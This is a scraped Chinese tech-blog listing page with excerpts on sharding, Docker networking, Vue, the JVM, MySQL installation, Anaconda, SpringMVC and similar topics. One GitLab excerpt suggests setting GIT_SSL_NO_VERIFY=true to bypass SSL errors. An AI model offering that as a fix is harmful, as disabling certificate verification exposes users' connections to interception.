设计分片策略： 首先需要确定适合应用的分片策略，如基于范围、哈希或列表等方式。根据应用的需求和数据特点选择合适的分片策略，并考虑分片键的选择。数据库架构设计： 根据分片策略设计数据库的整体架构。确定分片的数量和节点规模，以及分片之间的数据关联方式和数据路由规则。物理服务器部署： 根据数据库架构设计，部署和配置物理服务器。每个分片应该分配给独立的物理节点或服务器，确保每个节点有足够的计算和存储资源。数据库分片初始化： 在每个分片节点上创建数据库实例，并根据分片策略进行初始化。创建相应的表结构、索引和约束等，确保每个分片节点的数据库结构一致。数据迁移： 将现有的数据迁移到分片集群中。根据分片策略将数据拆分并导入到各个分片中，保证数据的一致性和完整性。这可能涉及数据导出、转换和导入的过程。应用程序更改： 修改应用程序代码，使其能够适应分片架构。更新数据库连接配置，确保应用程序能够正确地路由和访问各个分片。此外，还需要修改查询语句、事务处理和数据访问逻辑，以适应分片环境。负载均衡和路由配置： 配置负载均衡和路由机制，确保请求在分片集群中均匀分布。这可以通过负载均衡器或代理来实现，将请求路由到相应的分片节点。测试和监控： 对分片环境进行全面测试，确保分片策略的正确性和性能表现。设置监控系统，实时监测各个分片节点的运行状态和性能指标。 需要注意的是，开启分片是一个复杂的过程，需要综合考虑应用需求、数据特点和系统架构。在进行分片之前，建议进行充分的规划和评估，确保分片的正确实施和运维。同时，还需要考虑数据迁移的复杂性和系统升级的挑战。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6eb3f16489f76d07700470563a38d50c/" rel="bookmark">
			【Docker】Docker高级网络(NetWork)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【Docker】Docker高级网络(NetWork) 文章目录 【Docker】Docker高级网络(NetWork)1. 概述2. 网络2.1 网桥类型2.2 创建网络自定义桥2.3 查看所有网络2.4 查看特定网络的细节2.5 删除特定网络2.6 多个容器使用指定网络 参考文档：高级网络配置 · Docker – 从入门到实践 (docker-practice.github.io) 1. 概述 当 Docker 启动时，会自动在主机上创建一个 docker0 虚拟网桥，实际上是 Linux 的一个 bridge，可以理解为一个软件交换机。它会在挂载到它的网口之间进行转发。
同时，Docker 随机分配一个本地未占用的私有网段（在 RFC1918 中定义）中的一个地址给 docker0 接口。比如典型的 172.17.42.1，掩码为 255.255.0.0。此后启动的容器内的网口也会自动分配一个同一网段（172.17.0.0/16）的地址。
当创建一个 Docker 容器的时候，同时会创建了一对 veth pair 接口（当数据包发送到一个接口时，另外一个接口也可以收到相同的数据包）。这对接口一端在容器内，即 eth0；另一端在本地并被挂载到 docker0 网桥，名称以 veth 开头（例如 vethAQI2QT）。通过这种方式，主机可以跟容器通信，容器之间也可以相互通信。Docker 就创建了在主机和所有容器之间一个虚拟共享网络。
注意：
默认 docker 在创建容器时将所有容器都连接到 docker0 网桥上，默认在 docker0 网桥的容器都可以使用容器内ip地址进行通信。容器间还可以使用容器容器名称作为容器ip进行通信，前提是必须使用自定义的网桥，不能使用默认的 docker0 2. 网络 2.1 网桥类型 docker中网桥有四种类型：
**Bridge **：桥接式网络模式 (默认)Host：开放式网络模式，和宿主机共享网络Container：联合挂载式网络模式，和其他容器共享网络None：封闭式网络模式，不为容器配置网络 2.2 创建网络自定义桥 首先查看有关于网络的docker命令参数：
docker network --help 查看创建网桥的命令行参数：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6eb3f16489f76d07700470563a38d50c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d49913d5bbe39f8f37b72ed4ffca8b0/" rel="bookmark">
			.NetCore录屏生成Gif动图程序(Form)的开发过程[代码已上传GitCode]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🌮.NetCore录屏生成Gif动图程序(Form)的开发过程 前言:
开发环境：.NetCore3.1
GitCode地址：罗马苏丹默罕默德 / RecordDesktopGif · GitCode
FrameWork版本地址：尚未同步功能
实现功能
选中屏幕的一块矩形区域按照设置的参数录制生成Gif动图 🌀一,截取多张图片作为帧生成Gif ⛵️思路：
和视频一样，Gif同样是由多张大小一样的图片按帧进行播放，只需要多次截图屏幕（的区域）,再按时间顺序合成，则可得到录屏的Gif
使用工具：ImageSharp和System.Drawing（Tip:两个组件中有一些同名的类，需要使用全限定的类名）
代码实现
int fps = 20; //每秒截图的数量 int Secs = 3; //持续录制的时长 int INCR = 1; for (int i = 1; i &lt;= Secs* fps; i++) { CaptureScreenArea(0, 0, 200, 200, ref INCR); //截取屏幕左上角200x200的区域 Thread.Sleep(50); //请注意这里SleepTimex(Secs*fps) = Secs(秒) //Sleep时间和fps的公式为SleepTime = 1000/fps(毫秒) } //用一个数组加载上面保存再TempDir文件夹下的截图 SixLabors.ImageSharp.Image[] imgs = new SixLabors.ImageSharp.Image[Secs* fps]; for (int i = 0; i &lt; Secs* fps; i++) { imgs[i] = SixLabors.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d49913d5bbe39f8f37b72ed4ffca8b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1e210026bfbf42509ad4a572166c8bf/" rel="bookmark">
			纯前端实现增-删-改-查(模糊查询)和分页[本地存储当成数据库(vue &#43; element)]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于使用纯前端方式实现增删改查和分页这个小案例，还没开始做之前觉得颇有些难度，特别是在查询这方面，还没开始做时思想陷入了死胡同：查询的值要怎么才能正确匹配出来，万一有多个值要如何才能全部拿出来，还有本地存储的数据该存储写什么等等…等做完了之后，才发现，其实也没想象中的那么难。所以说，只是动脑子是没什么用的最重要的是要动手去做~~~
前面会先分析一波实现思路，最后会将代码全部贴出来，以供参考 看一下效果图(这里用的是一个简单的买家列表) 1. 向localStorage添加数据 // 增加 addNew() { this.list.unshift(this.form); this.list.sort((a, b) =&gt; { return new Date(b.time).getTime() - new Date(a.time).getTime(); }); //降序 window.localStorage.setItem("list", JSON.stringify(this.list)); this.form = {};//初始化新增表单 this.dialogFormVisible = false;//隐藏新增弹框 this.showList();//数据渲染 } // 数据渲染 showList() { if (JSON.parse(window.localStorage.getItem("list"))) { this.list = JSON.parse(window.localStorage.getItem("list")); this.tableData = [...this.list];//渲染表格数据 this.total = this.list.length;//数据总条数 this.changePage(this.list);//进入页面返回到第一页 } } 在添加进本地之前，首先得对数据进行一波处理，即：按时间排序；这里用到的是sort方法，相对来说还是比较简单的，对于sort方法在这里我就不详细说明了(网上有很多，不懂的可以去查)。
2.分页显示实现 // 当前页 handleCurrentChange(val) { this.currentPage = val;//当前页 if (this.searchData.length) { this.changePage(this.searchData);//如果查询数据存在，则渲染查询数据 } else { this.changePage(this.list);//不存在则渲染全部数据 } }, // 分页显示 changePage(obj) { const n = (this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1e210026bfbf42509ad4a572166c8bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ab5a3d6651c7b86da2251fb1044cc84/" rel="bookmark">
			前端工程化-规范项目创建React&#43;Vite&#43;TS&#43;eslint&#43;prettier&#43;stylelint&#43;husky &#43; commitlint &#43; lint-staged
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文节选自我的博客：前端工程化 - 规范项目创建 React+Vite+TS
💖 作者简介：大家好，我是MilesChen，偏前端的全栈开发者。📝 CSDN主页：爱吃糖的猫🔥📣 我的博客：爱吃糖的猫📚 Github主页: MilesChen🎉 支持我：点赞👍+收藏⭐️+留言📝💬介绍：The mixture of WEB+DeepLearning+Iot+anything🍁 前言 随着前端技术的快速发展，前端工程化已经成为现代化前端开发的必备技能。本篇文章。来带大家实现一个标准化前端项目。主要技术有技术栈为React + Vite + TS，用到规范工具有eslint+prettier+stylelint，规范化Git提交流程工具husky + commitlint + lint-staged，还有vite与tsconfig的配置。
项目安装前的准备 vscode先提前装好eslint，prettier，stylelint这三个插件。
后面统一使用pnpm包管理工具,pnpm是什么，先理解就是一个强大的包管理工具。
npm install -g pnpm
配置淘宝镜像源 pnpm config set registry https://registry.npm.taobao.org/
初始化项目 注意：这里加右划线转义
pnpm create vite react-starter --template react-swc-ts
pnpm i
pnpm i @types/node -D
package.json 中配置 node 版本限制提示 “engines”: { “node”: “&gt;=16.0.0” },
eslint、prettier、stylelint配置 配置 eslint 检查代码规范 pnpm i eslint -D
生成配置文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ab5a3d6651c7b86da2251fb1044cc84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36b3fcc9fb41c33e5e21d2739b0120bc/" rel="bookmark">
			在学习过程中理论不如实践吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近看了一些书，对学习这块有了一些新的感悟。
理论不如实践 像我们这些做IT技术的，为了不被淘汰，是要终身学习的。所以我经常会找一些书来看，但似乎进步缓慢。通过最近的学习和感悟，我知道其中原因是：没有真正把学习的到知识应用到实践中，所以很难加深这些知识的印象。
这一点可以从招聘中得到验证。几乎所有的招聘上都会要求有工作经验，比如你是做IT的，上面肯定会要求你有项目经验。有项目经验就说明你有实践过，只有实践过你才能真正掌握这些知识。
所以我觉得相比于学习理论知识，不如真正地实干，比如我们可以做一个自己的产品。在做产品的途中，我们一方面可以检验学习到的理论知识，另一方面在遇到不会的知识，可以倒逼自己去学习理论知识，而且这样学习的效果会更加深刻。
没有理论如何去实践 可能上一个观点给你的感觉是一切实践大于理论。但经过深刻的思考，我想这要分情况。
比如，你现在做完一个产品，你想通过这个产品来挣钱。你无从下手，只能先去学习相关的理论。学完理论，再参照理论去实践。
总结一下 理论和实践是相辅相成的。有时理论学的太多，但不拿到实践中，感觉是白学，有时只做不学理论，会很迷茫，需要到理论中寻找路。
借用孔子的话，稍微改造一下，那就是“学而不做则费，做而不学则罔”。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be6238bfbfadaa746dc7bc8c1d1d9401/" rel="bookmark">
			win10LTSC安装应用商店
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		电脑重装win10-LTSC版本，需要装应用商店
一条命令搞定
以管理员身份运行CMD（命令提示符）
输入“wsreset -i ” 命令 等一会就装好了（会提示报错，但不影响）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67d45e534f722431c5bccfcaabbfa3b5/" rel="bookmark">
			公式转换的Mathtype出现omml2mml.xsl 找不到问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在使用mathtype将word中的公式转化为math公式时，可能会出现以下情况：
The style sheet(omml2mml.xsl) required for this operation was not found···
按照网上的方式，我们只需将右键单击word快捷方式-&gt;属性-&gt;添加起始位置即可，注意，如果你在安装office时更改了安装位置 ，那么很有可能你所需要改的其实位置在：
C:\Program Files (x86)\Microsoft Office\root\Office16
大家可以尝试按这个路径找一下omml2mml.xsl，如果找到的话将上述位置作为word的起始位置即可！
添加成功后重启word就好啦。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/262b0e364b6d700dd0f70e9e70354017/" rel="bookmark">
			【Java】JVM执行流程、类加载过程和垃圾回收机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JVM执行流程执行引擎本地方法接口运行时数据区方法区堆虚拟机栈(线程私有)本地方法栈(线程私有)程序计数器(线程私有) 堆溢出问题类加载类加载的过程加载连接验证准备解析 初始化 双亲委派机制 垃圾回收死亡对象的判断算法引用计数算法可达性分析算法 垃圾回收的过程标记-清除算法复制算法标记-整理算法 垃圾收集器SerialParNewParallel ScavengeSerial OldParallel OldCMSG1 JVM，就是Java虚拟机，Java的的程序都是运行在JVM当中。
JVM执行流程 程序在执行之前先要把java源代码转换成字节码（class文件），JVM 首先需要把字节码通过一定的方(类加载器（ClassLoader）) 把文件加载到内存中的运行时数据区（Runtime Data Area） ，而字节码文件是 JVM 的一套指令集规范，并不能直接交个底层操作系统去执行，因此需要特定的命令解析器 执行引擎（Execution Engine）将字节码翻译成底层系统指令再交由CPU去执行，而这个过程中需要调用其他语言的接口(本地库接口（Native Interface))来实现整个程序的功能。
执行引擎 将Java字节码转换成CPU指令。
本地方法接口 调用不同系统的API实现不同的功能。
运行时数据区 方法区 方法区中存放的是类对象，可以理解为模板。在《Java虚拟机规范中》把此区域称之为“方法区”，而在 HotSpot 虚拟机的实现中，在 JDK 7 时此区域叫做永久代（PermGen），JDK 8 中叫做元空间（Metaspace）。运行时常量池是方法区的一部分，存放字面量与符号引用。
JDK 1.8 元空间的变化
1.对于现在使用最最广泛的 HotSpot 来说，JDK 8 元空间的内存属于本地内存，这样元空间的大小就不在受 JVM 最大内存的参数影响了，而是与本地内存的大小有关。
2.JDK 8 中将字符串常量池移动到了堆中。
堆 堆中存放的是new出来的具体对象。堆区和方法区之间是内存共享的：多个线程都可以去new对象，那么必须从方法区中拿对象的模板；每个线程创建出来的对象都会放在堆中。
虚拟机栈(线程私有) 栈主要记录的是 方法的调用关系和可能出现的栈溢出错误。 每一个线程都有对应的一个Java虚拟机栈，每调用一个方法都会以一个栈帧的形式加入到线程的栈中，方法执行完成之后栈帧就会被调出栈。此时可能存在一种情况，在递归调用时，调用的深度过深可能会出现栈溢出的错误。
局部变量表： 存放了编译器可知的各种基本数据类型(8大基本数据类型)、对象引用。局部变量表所需的内存空间在编译期间完成分配，当进入一个方法时，这个方法需要在帧中分配多大的局部变量空间是完全确定的，在执行期间不会改变局部变量表大小。简单来说就是存放方法参数和局部变量。操作栈：每个方法会生成一个先进后出的操作栈。动态连接：指向运行时常量池的方法引用。方法返回地址：PC 寄存器的地址。 什么是线程私有?
由于JVM的多线程是通过线程轮流切换并分配处理器执行时间的方式来实现，因此在任何一个确定的时刻，一个处理器(多核处理器则指的是一个内核)都只会执行一条线程中的指令。因此为了切换线程后能恢复到正确的执行位置，每条线程都需要独立的程序计数器，各条线程之间计数器互不影响，独立存储。我们就把类似这类区域称之为"线程私有"的内存
本地方法栈(线程私有) 工作原理和Java虚拟机栈一样，记录的是本地方法的调用关系。
程序计数器(线程私有) 记录了当前线程的方法执行到了那一行(指令)。程序计数器是一块比较小的内存空间，可以看做是当前线程所执行的字节码的行号指示器。如果当前线程正在执行的是一个Java方法，这个计数器记录的是正在执行的虚拟机字节码指令的地址；如果正在执行的是一个Native方法，这个计数器值为空。
堆溢出问题 Java堆用于存储对象实例，不断的创建对象，就可能会在对象数量达到最大堆容量后就会产生内存溢出。
演示堆溢出现象：
设置JVM参数-Xms:设置堆的最小值、-Xmx:设置堆最大值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/262b0e364b6d700dd0f70e9e70354017/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1950555828bcc00f1fd3012616cb0a79/" rel="bookmark">
			linux C&#43;&#43;开发常用的头文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #include &lt;bits/stdc++.h&gt; //包含绝大多数C++常用头文件 #include &lt;fcntl.h&gt;//open函数 #include &lt;sys/ioctl.h&gt;//ioctl函数 #include &lt;unistd.h&gt;//close函数 #include &lt;malloc.h&gt;//malloc函数 #include &lt;sys/mman.h&gt;//mmap函数 #include &lt;unistd.h&gt;//read函数 #include &lt;sys/stat.h&gt;//mkdir函数 #include &lt;fstream&gt;//std::ifstream #include &lt;arpa/inet.h&gt;//socket 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a62b2061d5d22df41b92e81c81247af/" rel="bookmark">
			记录CentOS7 Linux下安装MySQL8_适合正式环境_干货满满（超详细，默认开启了开机自启动，设置表名忽略大小写，提供详细配置，创建非root专属远程连接用户）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装前先清理mariadb和mysql相关文件： 通过命令：rpm -qa|grep mariadb 查询是否安装了mariadb
卸载：rpm -e --nodeps mariadb-libs-5.5.68-1.el7.x86_64(复制上面命令查到的完整名称)
通过命令：find / -name mysql 查询跟mysql相关的文件
删除文件命令：
rm -rf /etc/selinux/targeted/active/modules/100/mysql
rm -rf /usr/lib64/mysql
一、下载MySQL 选择Community社区免费版，其他的要收费，网址：MySQL :: Download MySQL Community Server
1. 按照下图选择 CentOS7就选择7的，CentOS8就选8，以此类推
本教程以CentOS7为例，MySQL版本为8.0.33
如果跟我版本不同，注意下面所有命令包含版本号的地方，要改正为你安装的版本
2. 然后找到对应安装包，本教程选择 RPM Bundle，点击Download 3. 下载 到终端通过wget命令下载（没有wget通过命令：yum -y install wget 安装）
先到 /usr/local 目录下：cd /usr/local
创建mysql文件夹：mkdir mysql
进入mysql文件夹：cd mysql
输入下载mysql安装包命令回车下载：wget + 上面右键复制的链接粘贴过来
如：wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-8.0.33-1.el7.x86_64.rpm-bundle.tar
输入 ls 命令查看，如上则下载好了
二、安装MySQL 1. 解压安装包 解压命令：tar -xvf mysql-8.0.33-1.el7.x86_64.rpm-bundle.tar
2. 分别安装 common、libs、client、server 4个模块 ​​​​ 安装命令：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a62b2061d5d22df41b92e81c81247af/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d971564655660c86e3309315a53a5a03/" rel="bookmark">
			Anaconda&#43;PyCharm创建环境及超详细配置指南，看这一篇就够了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 为什么是Python Python是一种面向对象的解释型计算机程序设计语言。
Python简单易用，功能强大，应用领域广泛，遍及人工智能、科学计算、机器学习、网络爬虫、大数据及云计算等。
一个语言能够这么广泛应用的前提，就是因为Python具有数量庞大且功能相对完善的标准库和第三方库。
然而，正是由于库的数量庞大，对于管理这些库以及对库作及时的维护成为既重要但复杂度又高的事情。
【----帮助相关技术学习，以下所有学习资料文末免费领！----】
例如，在实际项目开发中，我们通常会根据自己的需求去下载各种相应的框架库，如numpy，requests等，但是可能每个项目使用的框架库并不一样，或使用框架的版本不一样，这样需要我们根据需求不断的更新或卸载相应的库。
直接在系统默认环境安装会让我们的开发环境和项目造成很多不必要的麻烦，管理也相当混乱。
这时候，我们需要一个独立的环境，就是常说的Python虚拟环境解决方案。
虚拟环境提供了一个独立的空间，独立的环境，不同的项目可以在各自的环境中调用第三方工具，使用虚拟环境中的解释器。同时开发多个项目时，更加方便。
python的虚拟环境有pipenv, virtualenv, conda(Anaconda)。 这里我们选用的是Anaconda方案，下文会有具体介绍。
python官网：https://www.python.org/
python英文文档：https://docs.python.org/3/
python中文文档：https://docs.python.org/zh-cn/3/
Anaconda 介绍 Anaconda就是可以便捷获取包且对包能够进行管理，同时对环境可以统一管理的发行版本。
Anaconda包含了conda、Python在内的超过180个科学包及其依赖项。
简单来说，Anaconda包含了一堆常用的包，Anaconda提供了一套完整的虚拟环境解决方案，Anaconda提供了完善的包管理方案。
Anaconda官网：https://www.anaconda.com/
Anaconda英文文档：https://docs.anaconda.com/
Anaconda中文文档：https://anaconda.org.cn/
Anaconda是一个软件发行版，使用了conda进行包和环境管理。
后文说的很多命令，都是conda开头，在这里做下简单的说明。
Anaconda安装 下载地址：https://www.anaconda.com/products/distribution#macos
下载适合的环境，按照安装手册，一步步安装就可以了。
安装器若提示"Do you wish the installer to prepend the Anaconda install location to PATH in your .bash_profile?"
你希望安装器添加Anaconda安装路径在.bash_profile文件中吗？
建议输入“yes”。
验证安装结果： 打开终端，看到命令行最前面是否有(base)，这是Anaconda的默认安装环境:
或者输入命令 conda list 看一下环境里面的包:
安装后，可以使用conda update conda进行更新:
Anaconda新建环境 conda create -n env_name，其中 -n env_name 指定了环境的名字
切换到创建好的环境：
环境相关的命令：
创建虚拟环境 conda create -n xxx 进入虚拟环境 conda activate xxx 退出虚拟环境 conda deactivate 删除虚拟环境 conda remove --name xxx --all Anaconda 包安装 一般采用conda install 或者 pip install 安装包，这两个命令的区别在于：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d971564655660c86e3309315a53a5a03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bedf5fc0f93f71ecd55ba197473f61b3/" rel="bookmark">
			Pinia数据持久化插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里使用Pinia的一个插件: pinia-plugin-persistedstate
1. 安装： npm i pinia-plugin-persistedstate --save 2. 将插件添加到 pinia 实例上
// main.js import { createPinia } from 'pinia' import piniaPluginPersistedstate from 'pinia-plugin-persistedstate' const pinia = createPinia() app.use(pinia) pinia.use(piniaPluginPersistedstate) 3. 使用，创建 Store 时，将 persist 选项设置为 true。
// 管理用户数据相关 import {defineStore} from "pinia"; import {ref} from "vue"; import {loginAPI} from "@/apis/user"; export const useUserStore = defineStore('user', () =&gt; { // 1. 定义管理用户数据的state const userInfo = ref({}) // 2. 定义获取接口数据的action函数 const getUserInfo = async ({account, password}) =&gt; { const res = await loginAPI({account, password}) userInfo.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bedf5fc0f93f71ecd55ba197473f61b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95967b2f62ce9ee56575f316b0aac70d/" rel="bookmark">
			SpringMVC详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、SpringMVC的基本概念
（一）三层架构和MVC
1、三层架构概述
2、model1模式介绍
3、model2模式介绍
4、MVC模式介绍
（二）SpringMVC概述
1、SpringMVC是什么？
2、SpringMVC在三层架构中的位置
3、SpringMVC主要组件
二、SpringMVC入门
（一）SpringMVC的入门案例
1、入门案例需求分析
2、构建maven项目并添加依赖
3、web.xml中配置核心控制器DispatcherServlet
4、配置SpringMVC
5、构建页面发起请求
6、编写控制器并注解配置
7、启动服务器测试
（二）SpringMVC执行过程及原理分析
1、案例的执行过程
2、SpringMVC的请求响应流程
（三）SpringMVC常用组件介绍
1、DispatcherServlet：前端控制器
2、HandlerMapping：处理器映射器
3、Handler：处理器
4、HandlerAdapter：处理器适配器
5、View Resolver：视图解析器
6、View：视图
7、mvc:annotation-driven标签说明
（四）RequestMapping注解
1、RequestMapping注解源码解读
2、RequestMapping注解的描述
（1）注解位置
（2）注解属性
三、SpringMVC中的请求参数绑定
（一）绑定说明
1、绑定的机制
2、支持的数据类型
3、使用要求
（二）参数绑定示例
1、基本类型和string作为参数
（1）页面定义请求
（2）执行器方法绑定参数
2、POJO类型作为参数
（1）页面定义请求
（2）执行器方法绑定参数
3、POJO类中包含集合类型参数
（1）页面定义请求
（2）执行器方法绑定参数
4、数组类型参数
（1）页面定义请求
（2）执行器方法绑定参数
5、使用ServletAPI对象作为方法参数
（1）引用ServletAPI的依赖jar包
（2）执行器方法绑定参数
6、请求参数乱码问题
（1）Get请求的编码问题，要改tomcat的server.xml配置文件
（2）POST请求的编码问题，要在web.xml文件中配置编码过滤器
7、静态资源访问
（1）将静态资源交给默认的DefaultServlet处理
（2）指定静态资源的访问路径
（三）自定义参数处理
1、使用场景
2、使用步骤
（1）定义类型转换器
（2）配置类型转换器
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/95967b2f62ce9ee56575f316b0aac70d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f95cf883f926ada2e9a5f1ab98277477/" rel="bookmark">
			gitlab相关整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		cd existing_repo git init git remote add origin https://gitlab.revai.cn/用户名/xxx.git git branch -M main git push -uf origin main 出现 fatal: Not a git repository (or any of the parent directories): .git，是由于本地缺少.git目录，需要git init
用户名配置代码
git config --global user.email “用户邮箱” git config --global user.name “用户名” 出现SSL问题需要在linux服务器配置以下代码
export GIT_SSL_NO_VERIFY=true 出现warning: could not open directory 'mmdeploy/demo/python/': No such file or directory
fatal: pathspec 'mmdeploy/demo/python/pose_tracker26.py' did not match any files可能是由于路径不匹配，需要cd到gitlab相应文件下保证路径正确。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f096b2cafdab0a0c7ee14d8baa5f5cd3/" rel="bookmark">
			android10 SystemUI类结构图及初始化时序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d465621e5c9eabe25f8c0c4c76a1adbb/" rel="bookmark">
			Unity鼠标控制物体的旋转、移动、缩放等
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个是控制相机：(44条消息) unity 相机 旋转缩放查看 物体或地图_unity旋转查看物体_野区捕龙为宠的博客-CSDN博客
下面的是控制物体本身：
知识点：
Input.GetMouseButton(0)
获取鼠标输入，参数为一个int值
为0的时候获取的是左键
Input.GetMouseButton(1)
为1的时候获取的是右键
Input.GetMouseButton(2)
为2的时候获取的是中键（就是那个滑轮）
Input.GetMouseButton
鼠标点击
Input.GetMouseButtonUp
鼠标松开
Input.GetMouseButtonDown
鼠标按压
Camera.main.ScreenToWorldPoint
屏幕坐标转化为世界坐标
Quaternion rotation = Quaternion.Euler(0, 0, 0);
欧拉角转化为四元数
Input.GetKey(KeyCode.Mouse2)//按下滚轮键
尊重原著：Unity鼠标控制物体的旋转、移动、缩放等_unity 获取鼠标移动距离_Cuijiahao的博客-CSDN博客
方法一：
using System.Collections; using System.Collections.Generic; using UnityEngine; public class MouseControlModel : MonoBehaviour { //旋转最大角度 public int yMinLimit = -20; public int yMaxLimit = 80; //旋转速度 public float xSpeed = 250.0f; public float ySpeed = 120.0f; //旋转角度 private float x = 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d465621e5c9eabe25f8c0c4c76a1adbb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf305041b282f34b875af2a7f8985d2d/" rel="bookmark">
			ruoyi-vue中v-if与v-hasPermi同时用出现的bug
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前两天前端项目出现了一个bug，折腾了好久才弄明白。
出错的场景是：当列表第一次渲染没有报错，但翻页时报下面的错。
浏览器控制台报错：vue.runtime.esm.js:619 [Vue warn]: Error in nextTick: "NotFoundError: Failed to execute 'insertBefore' on 'Node': The node before which the new node is to be inserted is not a child of this node."
报完上面的错后，再点击翻页就不起作用了。
下面是我找出来导致出错的代码：
&lt;el-table-column label="操作" align="center" class-name="small-padding fixed-width" width="270" &gt; &lt;template slot-scope="scope"&gt; &lt;div&gt; &lt;div v-if="show" v-hasPermi="[x:x:x]"&gt;...&lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;/el-table-column&gt; 为什么报错，我的猜测是：
第一次渲染时，元素是显示的，由于vue的特性，它会复用该元素，在翻页后该元素原本是显示的，但此时v-if条件为false，隐藏了该元素，v-if的隐藏其实是把元素从dom中移除。
于此同时在v-hasPermi指令内正在操作这个移除的元素，所以就报了上面的错。
总结来说就是当我们操作那些不存在的dom元素就可能报上面的错。
我们来画两个图解释一下：
这是正常DOM元素的执行过程，没什么问题。
这是复用DOM元素的执行过程，图中说明为什么会报错。
解决方案：添加key不让其复用。
&lt;el-table-column label="操作" align="center" class-name="small-padding fixed-width" width="270" &gt; &lt;template slot-scope="scope"&gt; &lt;div :key="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf305041b282f34b875af2a7f8985d2d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bd664d954dd471d1b4deb2e62fc6219/" rel="bookmark">
			let,const, var在定义变量时的区别？什么是变量提升？如何解决变量提升？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		let和const是es6提出来的关键字，var（es5）,let定义变量时有块级作用域没有变量提升，let还有暂时性死区，在同一个作用域下let定义的变量名不能重名，const是用来定义常量的，同样有块级作用域，定义必须是赋值，定义的常量不能发生改变，而var有函数作用域，在函数内部声明的变量在函数外部是不可访问的，而且还会进行变量提升,在函数或全局作用域中，变量声明会被提升至作用域顶部，但初始化操作保留在原来的位置。可重复声明,可以随时修改 var 声明的变量的值。
变量提升: 在代码执行过程中，变量和函数声明会被提升至其所在作用域的顶部。这意味着可以在声明之前使用变量或调用函数，而不会引发错误。
如何解决变量提升:
1.使用let或const代替var：let和const是ES6引入的关键字，它们具有块级作用域的特性，并且不会发生变量提升。因此，建议尽量使用let或const来声明变量，以避免变量提升带来的潜在问题。
2.在变量使用之前进行声明和初始化：无论使用var、let还是const，都应该在变量使用之前进行明确的声明和初始化。这样可以避免依赖于变量提升，并且能够更好地理解代码的执行顺序。
